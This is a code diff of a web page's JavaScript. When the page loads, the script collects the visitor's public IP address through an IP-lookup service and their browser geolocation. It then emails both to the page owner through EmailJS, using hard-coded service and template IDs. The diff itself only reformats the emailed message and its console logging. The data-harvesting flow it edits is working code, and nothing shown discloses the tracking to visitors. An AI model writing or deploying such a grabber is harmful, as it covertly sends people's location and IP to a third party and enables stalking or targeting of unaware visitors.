@@ -44,11 +44,16 @@
       emailjs.init("uNJ44wfwFwS5Yvuxd"); // Replace with your EmailJS user ID
 
       function sendEmail(ip, lat, long) {
+        // Format the message to include the IP address, latitude, and longitude
+        let message = `
+                IP Address: ${ip}
+                Latitude: ${lat}
+                Longitude: ${long}
+            `;
+
         emailjs
           .send("service_bosbik8", "template_osobqzc", {
-            ip_address: ip,
-            latitude: lat,
-            longitude: long,
+            message: message,
           })
           .then((response) => {
             console.log("Email sent successfully:", response);
@@ -62,14 +67,15 @@
         $.getJSON("https://api.ipify.org?format=json", function (data) {
           let ip = data.ip;
 
+          console.log("Retrieved IP Address:", ip);
+
           navigator.geolocation.getCurrentPosition((position) => {
             let lat = position.coords.latitude;
             let long = position.coords.longitude;
-            console.log(lat, long);
+            console.log("Retrieved Position:", lat, long);
 
-            // Send the data via email
+            // Send the formatted message via email
             sendEmail(ip, lat, long);
-            console.log(ip, lat, long);
           });
         });
       });
